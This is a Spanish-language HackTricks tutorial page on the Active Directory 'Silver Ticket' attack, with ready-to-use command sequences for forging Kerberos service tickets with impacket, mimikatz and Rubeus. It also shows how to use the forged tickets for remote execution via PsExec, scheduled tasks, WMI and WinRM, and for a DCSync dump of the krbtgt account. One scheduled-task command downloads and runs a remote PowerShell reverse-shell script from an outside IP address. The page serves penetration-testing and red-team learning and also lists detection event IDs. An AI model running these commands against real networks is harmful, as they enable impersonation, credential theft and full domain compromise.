# Ticket de Plata

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y hackear lo imposible - **¡estamos contratando!** (_se requiere dominio del polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Ticket de Plata

El ataque de **Ticket de Plata** implica la explotación de tickets de servicio en entornos de Active Directory (AD). Este método se basa en **adquirir el hash NTLM de una cuenta de servicio**, como una cuenta de computadora, para falsificar un ticket de concesión de servicio (TGS). Con este ticket falsificado, un atacante puede acceder a servicios específicos en la red, **haciéndose pasar por cualquier usuario**, generalmente apuntando a privilegios administrativos. Se enfatiza que el uso de claves AES para falsificar tickets es más seguro y menos detectable.

Para la creación de tickets, se emplean diferentes herramientas según el sistema operativo:

### En Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### En Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
El servicio CIFS se destaca como un objetivo común para acceder al sistema de archivos de la víctima, pero otros servicios como HOST y RPCSS también pueden ser explotados para tareas y consultas de WMI.

## Servicios Disponibles

| Tipo de Servicio                           | Tickets Silver del Servicio                                               |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependiendo del SO también:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>En algunas ocasiones también se puede solicitar: WINRM</p> |
| Tareas Programadas                        | HOST                                                                       |
| Compartir Archivos de Windows, también psexec | CIFS                                                                       |
| Operaciones LDAP, incluido DCSync          | LDAP                                                                       |
| Herramientas de Administración Remota del Servidor de Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Tickets Dorados                            | krbtgt                                                                     |

Usando **Rubeus** puedes **solicitar todos** estos tickets utilizando el parámetro:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Eventos de Silver tickets

* 4624: Inicio de Sesión de Cuenta
* 4634: Cierre de Sesión de Cuenta
* 4672: Inicio de Sesión de Administrador

## Abusando de los tickets de Servicio

En los siguientes ejemplos, imaginemos que el ticket se obtiene suplantando la cuenta de administrador.

### CIFS

Con este ticket podrás acceder a las carpetas `C$` y `ADMIN$` a través de **SMB** (si están expuestas) y copiar archivos a una parte del sistema de archivos remoto simplemente haciendo algo como:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### ANFITRIÓN

Con este permiso, puedes generar tareas programadas en computadoras remotas y ejecutar comandos arbitrarios:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con estos tickets puedes **ejecutar WMI en el sistema víctima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encuentra **más información sobre wmiexec** en la siguiente página:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Con acceso winrm a una computadora, puedes **acceder a ella** e incluso obtener un PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
### LDAP

Con este privilegio, puedes volcar la base de datos del controlador de dominio utilizando **DCSync**.
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Aprende más sobre DCSync** en la siguiente página:

## Referencias
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y hackear lo imposible - **¡estamos contratando!** (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprende a hackear AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
